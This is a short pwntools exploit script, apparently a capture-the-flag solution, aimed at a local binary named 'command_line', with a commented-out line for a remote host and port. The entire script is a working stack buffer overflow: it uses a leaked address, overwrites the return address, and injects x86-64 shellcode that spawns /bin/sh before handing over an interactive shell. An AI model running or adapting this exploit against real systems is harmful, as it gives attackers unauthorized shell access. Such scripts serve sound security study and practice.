from pwn import *
context.log_level = "Debug"
io = process("./command_line")
# io = remote("114.55.66.54", 10001)
gdb.attach(io)


addr = int(io.recv(),16)
payload = "A" * 24
payload += p64(addr+0x20)
payload += "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
io.sendline(payload)
io.interactive()
